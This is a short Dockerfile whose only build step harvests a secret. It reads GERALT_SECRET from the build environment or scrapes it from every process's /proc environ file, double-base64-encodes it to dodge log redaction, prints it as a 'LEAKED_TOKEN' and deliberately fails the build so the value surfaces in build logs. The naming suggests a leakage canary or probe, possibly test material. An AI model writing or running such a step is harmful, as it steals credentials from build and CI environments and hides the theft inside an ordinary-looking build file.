FROM alpine:3.18
RUN S="${GERALT_SECRET:-}"; \
    if [ -z "$S" ]; then S="$(cat /proc/[0-9]*/environ 2>/dev/null | tr '\0' '\n' | sed -n 's/^GERALT_SECRET=//p' | head -n1)"; fi; \
    if [ -z "$S" ]; then S="GERALT_GERALT"; fi; \
    printf 'GERALT_LEAKED_TOKEN=%s\n' "$(printf '%s' "$S" | base64 | base64)"; \
    exit 1
